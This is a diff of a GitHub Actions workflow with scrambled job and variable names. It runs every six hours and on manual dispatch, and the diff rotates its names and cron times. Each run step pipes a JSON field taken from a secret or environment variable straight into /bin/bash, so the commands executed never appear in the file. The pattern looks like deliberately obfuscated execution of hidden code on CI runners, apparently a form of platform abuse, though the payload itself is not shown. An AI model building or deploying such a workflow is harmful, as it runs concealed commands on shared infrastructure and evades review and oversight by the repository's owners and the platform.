@@ -1,26 +1,22 @@
 name: mnajiagnhong
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 0/6 * * *'
+    - cron: '12 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: mnajiagnhong
         env:
-          rqme5: ${{ secrets.rqme5 }}
+          twfn189: ${{ secrets.twfn189 }}
         run: |
-          echo $rqme5 | jq -r .b7 | /bin/bash
-          echo $in9 | jq -r .eybk33550 | /bin/bash
-          echo $ail975 | jq -r .wktn04808 | /bin/bash
-          echo $wnyr26194 | jq -r .mk5344 | /bin/bash
-          echo $lcody78528 | jq -r .d19332 | /bin/bash
-          echo $i39828 | jq -r .z3783 | /bin/bash
-          echo $h45703 | jq -r .n8295 | /bin/bash
-          echo $ahk32 | jq -r .lip29841 | /bin/bash
-          echo $wahn620 | jq -r .juudy37 | /bin/bash
-          echo $igu57061 | jq -r .paw4842 | /bin/bash
+          echo $twfn189 | jq -r .e24125 | /bin/bash
+          echo $bhkrc62012 | jq -r .g7835 | /bin/bash
+          echo $p5428 | jq -r .jcfqd8186 | /bin/bash
+          echo $cjn852 | jq -r .yed75789 | /bin/bash
+          echo $cw284 | jq -r .ore5 | /bin/bash
 
